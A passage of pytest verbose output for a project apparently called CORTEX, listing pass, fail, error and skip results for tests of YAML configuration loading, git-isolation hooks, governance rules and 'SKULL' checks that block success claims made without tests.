tests/test_risk_mitigation.py::TestInputSanitization::test_path_traversal_prevention PASSED [ 55%]
tests/test_risk_mitigation.py::TestContextInjectionPerformance::test_context_injection_under_200ms ERROR [ 55%]
tests/test_risk_mitigation.py::TestContextInjectionPerformance::test_fts5_search_under_100ms ERROR [ 55%]
tests/test_risk_mitigation.py::TestConcurrentOperations::test_concurrent_database_writes PASSED [ 55%]
tests/test_risk_mitigation.py::TestConcurrentOperations::test_concurrent_workflow_executions PASSED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_config_structure FAILED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_slash_commands_structure ERROR [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_cortex_operations_structure PASSED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_config_data_integrity FAILED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_no_duplicate_operation_ids FAILED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_no_duplicate_commands ERROR [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_aliases_reference_valid_commands ERROR [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_config_load_performance PASSED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_slash_commands_load_performance FAILED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_cortex_operations_load_performance FAILED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_all_yaml_files_load_together FAILED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_match_yaml_definitions FAILED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_commands_have_operation_mapping ERROR [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_yaml_contains_all_legacy_operations PASSED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_yaml_files_are_valid_yaml FAILED [ 55%]
tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_have_module_structure FAILED [ 55%]
tests/test_yaml_conversion.py::TestTokenReductionPreliminary::test_yaml_files_exist PASSED [ 56%]
tests/test_yaml_conversion.py::TestTokenReductionPreliminary::test_yaml_files_not_empty FAILED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_brain_protection_rules_loads PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_brain_protection_rules_structure FAILED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_brain_protection_rules_content FAILED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_operations_config_loads PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_operations_config_structure PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_operations_config_content PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_operations_config_profiles PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_module_definitions_loads PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_module_definitions_structure PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_module_definitions_content PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_module_definitions_statistics PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_design_metadata_loads PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_design_metadata_structure PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_design_metadata_phases FAILED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_yaml_handles_missing_file PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_yaml_handles_malformed_content PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_yaml_handles_empty_file PASSED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_yaml_loading_performance FAILED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_all_yaml_files_consistent FAILED [ 56%]
tests/test_yaml_loading.py::TestYAMLLoading::test_module_dependencies_valid PASSED [ 57%]
tests/test_yaml_loading.py::TestYAMLTokenOptimization::test_yaml_file_sizes FAILED [ 57%]
tests/test_yaml_loading.py::TestYAMLTokenOptimization::test_yaml_token_estimation PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestPassiveVoiceDetection::test_detects_passive_designed PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestPassiveVoiceDetection::test_detects_passive_created PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestPassiveVoiceDetection::test_detects_passive_wrote PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestPassiveVoiceDetection::test_detects_passive_implemented PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestPassiveVoiceDetection::test_detects_documentary_one_evening_while PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestPassiveVoiceDetection::test_detects_documentary_after_completing PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestPassiveVoiceDetection::test_detects_documentary_while_reviewing PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestActiveVoiceAllowed::test_allows_so_asif_built PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestActiveVoiceAllowed::test_allows_he_grabbed PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestActiveVoiceAllowed::test_allows_that_evening PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestActiveVoiceAllowed::test_allows_three_hours_later PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestActiveVoiceAllowed::test_allows_asif_stared_and_decided PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestThirdPersonPreserved::test_allows_asif_codeinstein_name PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestThirdPersonPreserved::test_allows_he_his_him PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestThirdPersonPreserved::test_rejects_first_person_i PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestTransformationPatterns::test_transformation_designed_to_built PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestTransformationPatterns::test_transformation_wrote_routines_to_grabbed PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestTransformationPatterns::test_transformation_one_evening_while_to_that_evening PASSED [ 57%]
tests/tier0/test_active_narrator_voice.py::TestTransformationPatterns::test_transformation_after_completing_to_complete PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestStoryConsistency::test_feature_not_mentioned_before_introduction PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestStoryConsistency::test_no_deprecated_kds_references PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestStoryConsistency::test_no_deprecated_monolithic_references PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestNarratorVoiceAnalysis::test_calculates_violation_rate PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestNarratorVoiceAnalysis::test_identifies_passive_vs_documentary PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestFeatureInventory::test_extracts_implemented_features PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestFeatureInventory::test_extracts_designed_features PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestFeatureInventory::test_maps_features_to_chapters PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestDeprecatedSectionDetection::test_detects_kds_reference PASSED [ 58%]
tests/tier0/test_active_narrator_voice.py::TestDeprecatedSectionDetection::test_suggests_replacement PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestYAMLConfiguration::test_loads_yaml_configuration PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestYAMLConfiguration::test_has_all_protection_layers PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestYAMLConfiguration::test_critical_paths_loaded PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestYAMLConfiguration::test_application_paths_loaded PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestYAMLConfiguration::test_brain_state_files_loaded PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestInstinctImmutability::test_detects_tdd_bypass_attempt PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestInstinctImmutability::test_detects_dod_bypass_attempt PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestInstinctImmutability::test_allows_compliant_changes PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestTierBoundaryProtection::test_detects_application_data_in_tier0 PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestTierBoundaryProtection::test_warns_conversation_data_in_tier2 PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestSOLIDCompliance::test_detects_god_object_pattern PASSED [ 58%]
tests/tier0/test_brain_protector.py::TestSOLIDCompliance::test_detects_hardcoded_dependencies PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestHemisphereSpecialization::test_detects_strategic_logic_in_left_brain PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestHemisphereSpecialization::test_detects_tactical_logic_in_right_brain PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestKnowledgeQuality::test_detects_high_confidence_single_event PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestCommitIntegrity::test_detects_brain_state_commit_attempt PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestChallengeGeneration::test_generates_challenge_with_alternatives PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestChallengeGeneration::test_challenge_includes_severity PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestEventLogging::test_logs_protection_event PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestEventLogging::test_log_contains_alternatives PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestMultipleViolations::test_combines_multiple_violations PASSED [ 59%]
tests/tier0/test_brain_protector.py::TestMultipleViolations::test_blocked_severity_overrides_warning PASSED [ 59%]
tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingProtection::test_process_logs_to_tier1_sqlite PASSED [ 59%]
tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingProtection::test_session_continuity_across_messages PASSED [ 59%]
tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingProtection::test_fifo_queue_enforcement PASSED [ 59%]
tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingProtection::test_no_data_loss_between_invocations PASSED [ 59%]
tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingProtection::test_backward_compatibility_with_jsonl PASSED [ 59%]
tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingProtection::test_cortex_capture_script_integration SKIPPED [ 59%]
tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingHealth::test_database_schema_integrity PASSED [ 59%]
tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingHealth::test_performance_under_load PASSED [ 59%]
tests/tier0/test_brain_protector_new_rules.py::TestMachineReadableFormatEnforcement::test_detects_structured_table_in_markdown PASSED [ 59%]
tests/tier0/test_brain_protector_new_rules.py::TestMachineReadableFormatEnforcement::test_detects_structured_list_in_markdown PASSED [ 59%]
tests/tier0/test_brain_protector_new_rules.py::TestMachineReadableFormatEnforcement::test_allows_narrative_markdown PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestDefinitionOfReadyValidation::test_detects_implementation_without_dor PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestDefinitionOfReadyValidation::test_allows_implementation_with_dor PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestDefinitionOfReadyValidation::test_allows_bug_fix_without_dor PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestModularFileStructureLimits::test_warns_file_exceeds_soft_limit PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestModularFileStructureLimits::test_blocks_file_exceeds_hard_limit PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestModularFileStructureLimits::test_allows_small_files PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestHemisphereSeparationStrict::test_detects_strategic_logic_in_left_brain PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestHemisphereSeparationStrict::test_detects_tactical_logic_in_right_brain PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestHemisphereSeparationStrict::test_allows_corpus_callosum_coordination PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestPluginArchitectureEnforcement::test_detects_feature_added_to_core PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestPluginArchitectureEnforcement::test_allows_plugin_implementation PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestPluginArchitectureEnforcement::test_allows_core_bug_fixes PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestStoryTechnicalRatioValidation::test_warns_too_much_technical_content PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestStoryTechnicalRatioValidation::test_allows_proper_story_ratio PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestStoryTechnicalRatioValidation::test_ignores_ratio_for_technical_docs PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestIntegrationWithExistingTests::test_yaml_configuration_loads PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestIntegrationWithExistingTests::test_all_protection_layers_active PASSED [ 60%]
tests/tier0/test_brain_protector_new_rules.py::TestIntegrationWithExistingTests::test_compatible_with_existing_workflow PASSED [ 60%]
tests/tier0/test_conversation_tracking_integration.py::test_cortex_cli_tracks_conversations PASSED [ 60%]
tests/tier0/test_conversation_tracking_integration.py::test_validation_command PASSED [ 60%]
tests/tier0/test_conversation_tracking_integration.py::test_powershell_capture_script PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_entry_point_exists PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_token_count_hard_limit PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_token_count_warning PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_token_count_target PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_line_count_limit FAILED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_references_valid_files PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_no_excessive_inline_docs PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_modular_architecture_present PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_response_templates_externalized PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_no_python_execution_for_help PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_version_documented PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_status_documented PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_copyright_present PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointBloat::test_performance_metrics PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointArchitecture::test_quick_start_section PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointArchitecture::test_help_command_documented PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointArchitecture::test_slash_commands_documented PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointArchitecture::test_plugin_system_referenced PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointArchitecture::test_tracking_system_referenced PASSED [ 61%]
tests/tier0/test_entry_point_bloat.py::TestEntryPointArchitecture::test_brain_architecture_referenced PASSED [ 61%]
tests/tier0/test_fifo_enforcement.py::TestFIFOEnforcement::test_fifo_enforcement_60_conversations PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestGitIsolationEnforcer::test_initializes_with_user_repo_path PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestGitIsolationEnforcer::test_detects_git_repository PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestGitIsolationEnforcer::test_fails_if_not_git_repo PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestHookInstallation::test_installs_pre_commit_hook PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestHookInstallation::test_installs_pre_push_hook PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestHookInstallation::test_creates_hooks_directory_if_missing PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestHookInstallation::test_does_not_overwrite_existing_hooks_with_cortex_marker PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestProtectedPathDetection::test_detects_tier0_path PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestProtectedPathDetection::test_detects_tier1_path PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestProtectedPathDetection::test_detects_tier2_path PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestProtectedPathDetection::test_detects_cortex_agents_path PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestProtectedPathDetection::test_detects_cortex_brain_path PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestProtectedPathDetection::test_detects_prompts_path PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestProtectedPathDetection::test_allows_application_code PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestProtectedPathDetection::test_allows_team_knowledge_directory PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestStagedFileChecking::test_allows_clean_commit PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestStagedFileChecking::test_blocks_cortex_tier0_file PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestStagedFileChecking::test_blocks_cortex_brain_directory PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestStagedFileChecking::test_allows_team_knowledge_yaml PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestHookUninstallation::test_uninstalls_hooks PASSED [ 62%]
tests/tier0/test_git_isolation.py::TestHookUninstallation::test_only_removes_cortex_hooks PASSED [ 63%]
tests/tier0/test_git_isolation.py::TestPublicAPI::test_install_git_isolation_hooks_function PASSED [ 63%]
tests/tier0/test_git_isolation.py::TestPublicAPI::test_check_git_isolation_function PASSED [ 63%]
tests/tier0/test_git_isolation.py::TestProtectedPathsConstant::test_includes_all_tier_directories PASSED [ 63%]
tests/tier0/test_git_isolation.py::TestProtectedPathsConstant::test_includes_cortex_agents PASSED [ 63%]
tests/tier0/test_git_isolation.py::TestProtectedPathsConstant::test_includes_cortex_brain PASSED [ 63%]
tests/tier0/test_git_isolation.py::TestProtectedPathsConstant::test_includes_prompts PASSED [ 63%]
tests/tier0/test_git_isolation.py::TestBrainProtectionRuleIntegration::test_git_isolation_enforcement_in_tier0_instincts PASSED [ 63%]
tests/tier0/test_git_isolation.py::TestBrainProtectionRuleIntegration::test_git_isolation_layer_exists PASSED [ 63%]
tests/tier0/test_governance.py::TestGovernanceEngineInitialization::test_loads_governance_file_successfully PASSED [ 63%]
tests/tier0/test_governance.py::TestGovernanceEngineInitialization::test_indexes_rules_by_id PASSED [ 63%]
tests/tier0/test_governance.py::TestGovernanceEngineInitialization::test_loads_expected_rule_count PASSED [ 63%]
tests/tier0/test_governance.py::TestGovernanceEngineInitialization::test_raises_error_for_missing_file PASSED [ 63%]
tests/tier0/test_governance.py::TestTDDEnforcement::test_blocks_implementation_without_test PASSED [ 63%]
tests/tier0/test_governance.py::TestTDDEnforcement::test_challenges_test_written_after_code PASSED [ 63%]
tests/tier0/test_governance.py::TestTDDEnforcement::test_allows_test_first_development PASSED [ 63%]
tests/tier0/test_governance.py::TestTDDEnforcement::test_logs_tdd_violations PASSED [ 63%]
tests/tier0/test_governance.py::TestDefinitionOfDone::test_validates_all_criteria_met PASSED [ 63%]
tests/tier0/test_governance.py::TestDefinitionOfDone::test_blocks_when_criteria_not_met PASSED [ 63%]
tests/tier0/test_governance.py::TestDefinitionOfDone::test_identifies_specific_failed_criteria PASSED [ 63%]
tests/tier0/test_governance.py::TestDefinitionOfReady::test_validates_all_criteria_met PASSED [ 63%]
tests/tier0/test_governance.py::TestDefinitionOfReady::test_blocks_work_when_not_ready PASSED [ 64%]
tests/tier0/test_governance.py::TestTierBoundaryProtection::test_detects_conversation_data_in_tier_0 PASSED [ 64%]
tests/tier0/test_governance.py::TestTierBoundaryProtection::test_detects_governance_in_tier_1 PASSED [ 64%]
tests/tier0/test_governance.py::TestTierBoundaryProtection::test_allows_correct_tier_data PASSED [ 64%]
tests/tier0/test_governance.py::TestTierBoundaryProtection::test_detects_patterns_in_tier_1 PASSED [ 64%]
tests/tier0/test_governance.py::TestChallengeProtocol::test_creates_challenge_with_risks PASSED [ 64%]
tests/tier0/test_governance.py::TestChallengeProtocol::test_challenge_includes_timestamp PASSED [ 64%]
tests/tier0/test_governance.py::TestRuleRetrieval::test_gets_rule_by_id PASSED [ 64%]
tests/tier0/test_governance.py::TestRuleRetrieval::test_returns_none_for_unknown_rule PASSED [ 64%]
tests/tier0/test_governance.py::TestRuleRetrieval::test_gets_all_rules PASSED [ 64%]
tests/tier0/test_governance.py::TestRuleRetrieval::test_filters_rules_by_severity PASSED [ 64%]
tests/tier0/test_governance.py::TestViolationLogging::test_logs_violations PASSED [ 64%]
tests/tier0/test_governance.py::TestViolationLogging::test_filters_violations_by_severity PASSED [ 64%]
tests/tier0/test_governance.py::TestViolationLogging::test_limits_violation_results PASSED [ 64%]
tests/tier0/test_governance.py::TestViolationLogging::test_clears_violations PASSED [ 64%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_operation_result_has_header_footer_fields PASSED [ 64%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_format_minimalist_header_returns_string PASSED [ 64%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_format_completion_footer_returns_string PASSED [ 64%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_response_formatter_uses_stored_header PASSED [ 64%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_response_formatter_uses_stored_footer PASSED [ 64%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_headers_wrapped_in_code_blocks PASSED [ 64%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_copyright_attribution_visible PASSED [ 64%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_purpose_provides_context PASSED [ 65%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_accomplishments_show_value_delivered PASSED [ 65%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_integration_design_sync_operation PASSED [ 65%]
tests/tier0/test_skull_006_headers_in_response.py::TestSKULL006HeadersInResponse::test_missing_header_footer_graceful_fallback PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLBannerImages::test_help_table_has_banner_image PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLBannerImages::test_help_detailed_has_banner_image PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLBannerImages::test_operation_started_has_ascii_banner PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLBannerImages::test_orchestrator_header_has_full_banner PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLBannerImages::test_banner_image_properly_formatted PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLBannerImages::test_copyright_in_all_headers PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLBannerImages::test_ascii_banner_visual_consistency PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLBannerImages::test_structured_response_format PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLASCIIBannerContent::test_ascii_logo_structure PASSED [ 65%]
tests/tier0/test_skull_ascii_headers.py::TestSKULLASCIIBannerContent::test_banner_metadata_complete PASSED [ 65%]
tests/tier0/test_skull_comprehensive.py::TestSkullBanner::test_skull_banner_renders SKIPPED [ 65%]
tests/tier0/test_skull_comprehensive.py::TestSkullBanner::test_violation_message_includes_branding PASSED [ 65%]
tests/tier0/test_skull_comprehensive.py::TestSkull001TestBeforeClaim::test_blocks_success_claim_without_tests PASSED [ 65%]
tests/tier0/test_skull_comprehensive.py::TestSkull001TestBeforeClaim::test_passes_with_test_validation PASSED [ 65%]
tests/tier0/test_skull_comprehensive.py::TestSkull001TestBeforeClaim::test_detects_all_success_claims[fixed \u2705] PASSED [ 65%]
tests/tier0/test_skull_comprehensive.py::TestSkull001TestBeforeClaim::test_detects_all_success_claims[complete \u2705] PASSED [ 65%]
tests/tier0/test_skull_comprehensive.py::TestSkull001TestBeforeClaim::test_detects_all_success_claims[done \u2705] PASSED [ 65%]
tests/tier0/test_skull_comprehensive.py::TestSkull001TestBeforeClaim::test_detects_all_success_claims[implemented \u2705] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull001TestBeforeClaim::test_detects_all_success_claims[resolved \u2705] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull001TestBeforeClaim::test_detects_all_success_claims[working \u2705] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull002IntegrationVerification::test_blocks_integration_without_e2e_test PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull002IntegrationVerification::test_passes_with_e2e_test PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull002IntegrationVerification::test_detects_integration_test_patterns[test_full_integration] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull002IntegrationVerification::test_detects_integration_test_patterns[test_end_to_end_workflow] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull002IntegrationVerification::test_detects_integration_test_patterns[test_e2e_pipeline] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull002IntegrationVerification::test_detects_integration_test_patterns[test_integration_complete] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull003VisualRegression::test_warns_css_change_without_visual_test PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull003VisualRegression::test_passes_css_change_with_visual_test PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull003VisualRegression::test_detects_visual_test_patterns[test_visual_regression] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull003VisualRegression::test_detects_visual_test_patterns[test_computed_style] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull003VisualRegression::test_detects_visual_test_patterns[test_browser_render] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull003VisualRegression::test_detects_visual_test_patterns[test_playwright_screenshot] FAILED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull003VisualRegression::test_detects_visual_test_patterns[test_css_computed] PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull004RetryWithoutLearning::test_warns_retry_without_diagnosis PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull004RetryWithoutLearning::test_passes_retry_with_diagnosis PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull004RetryWithoutLearning::test_requires_changed_approach FAILED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull005TransformationVerification::test_blocks_transformation_claim_without_changes FAILED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull005TransformationVerification::test_passes_transformation_with_changes PASSED [ 66%]
tests/tier0/test_skull_comprehensive.py::TestSkull005TransformationVerification::test_allows_validation_only_operations PASSED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestSkull005TransformationVerification::test_detects_pass_through_operations FAILED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestRealWorldIncidentPrevention::test_prevents_november_9th_css_incident PASSED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestRealWorldIncidentPrevention::test_prevents_november_9th_vision_api_incident PASSED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestRealWorldIncidentPrevention::test_prevents_november_10th_story_refresh_incident FAILED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestMultipleViolations::test_css_retry_without_tests_or_diagnosis FAILED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestMultipleViolations::test_integration_transformation_without_verification PASSED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestEnforcementBehavior::test_blocking_raises_exception PASSED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestEnforcementBehavior::test_warning_returns_validation PASSED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestEnforcementBehavior::test_safe_passes_through FAILED [ 67%]
tests/tier0/test_skull_comprehensive.py::TestSkullResponseTemplateIntegration::test_help_command_shows_skull_banner FAILED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_001_blocks_fix_without_tests PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_001_passes_fix_with_tests PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_001_raises_exception_on_blocking_violation PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_002_blocks_integration_without_e2e_test PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_002_passes_integration_with_e2e_test PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_002_detects_integration_keyword PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_003_warns_css_change_without_visual_test PASSED [ 67%]
tests/tier0/test_skull_protector.py::TestSkullProtector::test_skull_003_passes_css_change_with_visual_test PASSED [ 67%]
